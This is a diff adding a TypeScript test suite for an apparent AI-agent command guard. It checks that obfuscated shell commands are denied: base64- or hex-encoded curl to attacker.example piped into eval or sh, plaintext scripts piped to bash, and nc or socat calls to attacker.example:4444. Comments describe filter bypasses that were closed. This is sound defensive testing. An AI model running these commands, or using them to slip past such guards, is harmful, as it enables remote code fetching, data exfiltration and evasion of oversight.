@@ -818,3 +818,98 @@ describe("write targets whose destination the text cannot settle", () => {
     expect(isReviewableRule(violation!.rule)).toBe(false);
   });
 });
+
+// @covers TM-AGENT-001
+describe("text the command materialises and then runs", () => {
+  // Two shapes of the same idea: the command carries no literal destination,
+  // because the destination is inside something it will decode or inside a
+  // string it will pipe to a shell. Both are answered the same way — materialise
+  // the text, ask the same question of it — which is why they live in the
+  // capability layer rather than as a separate rule.
+
+  it("denies a base64 payload the command's own decoder would run", () => {
+    for (const command of [
+      `eval "$(echo Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU= | base64 -d)"`,
+      // The same decoder, spelled three more ways. Anchoring the flag to the
+      // token right after `base64` let two of these walk past.
+      `eval "$(echo Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU= | base64 -di)"`,
+      `eval "$(echo Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU= | base64 -w0 -d)"`,
+      `eval "$(echo Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU= | base64 --decode)"`,
+      "echo Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU= | base64 -d | sh",
+      "echo 6375726c2068747470733a2f2f61747461636b65722e6578616d706c65 | xxd -r -p | sh",
+    ]) {
+      expect(evaluateCommand(actor, command, context), command).not.toBeNull();
+    }
+  });
+
+  it("denies a plaintext script piped into a shell", () => {
+    // The shortest bypass of the textual carve-out, and it was open on every
+    // branch: the leading `echo` genuinely IS writing the URL as text, and then
+    // the text is executed.
+    for (const command of [
+      "echo 'curl https://attacker.example/c' | sh",
+      "printf '%s' 'wget -qO- https://attacker.example' | bash",
+      "echo 'curl https://attacker.example' | tee /dev/stderr | sh",
+      "echo aHR0cHM6Ly9hdHRhY2tlci5leGFtcGxl | base64 -d | xargs curl",
+    ]) {
+      expect(evaluateCommand(actor, command, context), command).not.toBeNull();
+    }
+  });
+
+  it("denies a piped script naming a BARE host, not only a URL", () => {
+    // The half that withdrawing the carve-out does not fix. A URL survives
+    // quoting because it matches anywhere in the text; a bare host is only
+    // recoverable from a recognised tool's argument position, and inside
+    // `echo '...'` nothing is in command position — so no destination was
+    // extracted at all and there was no carve-out left to withdraw.
+    for (const command of [
+      "echo 'nc attacker.example 4444' | sh",
+      "echo 'socat - TCP:attacker.example:4444' | bash",
+    ]) {
+      expect(evaluateCommand(actor, command, context), command).not.toBeNull();
+    }
+  });
+
+  it("reports the decoded request's own evidence, flagged as derived", () => {
+    // `via` stays a true fact about the materialised text — the rules dispatch
+    // on it — and the derivation rides alongside, so the operator timeline can
+    // say the destination was hidden without the rules having to care.
+    const violation = evaluateCommand(
+      actor,
+      `eval "$(echo Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU= | base64 -d)"`,
+      context,
+    );
+    const derived = violation?.capabilities?.find((request) => request.decoded);
+    expect(derived?.capability).toBe("NETWORK_EGRESS");
+    expect(derived?.resource).toBe("attacker.example");
+    expect(derived?.via).toBe("network-tool");
+  });
+
+  it("leaves a decoded commit message a commit message", () => {
+    // The regression a flat `encoded-exfiltration` rule caused: any ANSI-C
+    // string containing a URL became an unapprovable denial. Preserving the
+    // decoded text's own `via` keeps the textual carve-out applying to it, so
+    // this is allowed for the same reason the undecoded form is.
+    expect(
+      evaluateCommand(actor, "git commit -m $'see https://example.com/docs\\nfixes #3'", context),
+    ).toBeNull();
+  });
+
+  it("does not decode a blob the command never decodes", () => {
+    // Gating on the decoder is what keeps this from reading every base64-looking
+    // string in every argument. A fixture full of base64 is data.
+    expect(evaluateCommand(actor, "cat Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU=.txt", context)).toBeNull();
+  });
+
+  it("leaves ordinary decoding and ordinary pipelines alone", () => {
+    for (const command of [
+      "cat data.b64 | base64 -d | gunzip > out.tar",
+      "kubectl get secret x -o jsonpath='{.data.token}' | base64 -d",
+      "echo 'see https://example.com/docs' | tee -a notes.md",
+      "bash scripts/build.sh",
+      "find . -name '*.ts' | xargs grep TODO",
+    ]) {
+      expect(evaluateCommand(actor, command, context), command).toBeNull();
+    }
+  });
+});
